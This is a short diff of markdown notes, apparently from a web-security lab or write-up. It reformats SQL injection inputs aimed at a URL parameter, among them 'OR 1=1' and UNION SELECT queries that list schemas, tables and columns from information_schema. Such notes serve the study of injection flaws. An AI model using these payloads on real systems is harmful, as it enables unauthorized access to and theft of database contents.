@@ -524,17 +524,14 @@ session |	userinfo 	prid 		5
 
 - Choose {option} from radio button, then click submit
   - interact with url:
-```
 
-```
+``` Section=4 OR 1=1 (for each selection 1..4) ```
 
-Section=4 OR 1=1 (for each selection 1..4)
+``` Selection=2 UNION, SELECT 1,2,3 ```
 
-Selection=2 UNION, SELECT 1,2,3
+``` UNION SELECT table_schema,table_name,column_name from information_schema.columns ```
 
-UNION SELECT table_schema,table_name,column_name from information_schema.columns
-
-UNION SELECT table_schema,column_name,table_name from information_schema.columns
+``` UNION SELECT table_schema,column_name,table_name from information_schema.columns ```
 
 
 
